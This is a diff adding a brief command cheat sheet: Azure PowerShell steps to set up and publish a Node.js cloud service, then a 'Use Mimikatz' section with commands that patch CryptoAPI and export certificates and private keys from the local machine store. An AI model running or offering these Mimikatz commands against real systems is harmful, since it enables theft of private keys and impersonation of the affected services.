@@ -1,0 +1,27 @@
+~~~ Setup ~~~
+
+Install-Module -Name AzureRM
+
+Import-Module AzureRM
+
+Connect-AzureRmAccount
+
+~~~ Generate Project ~~~
+
+New-AzureServiceProject nodeserviceproject
+
+Add-AzureNodeWebRole
+
+Get-AzurePublishSettingsFile
+
+Import-AzurePublishSettingsFile path-to-file
+
+Publish-AzureServiceProject -ServiceName service-name-here -Location "East US" -Launch
+
+~~~ Use Mimikatz ~~~
+
+mimikatz.exe
+
+crypto::capi
+
+crypto::certificates /systemstore:local_machine /store:my /export
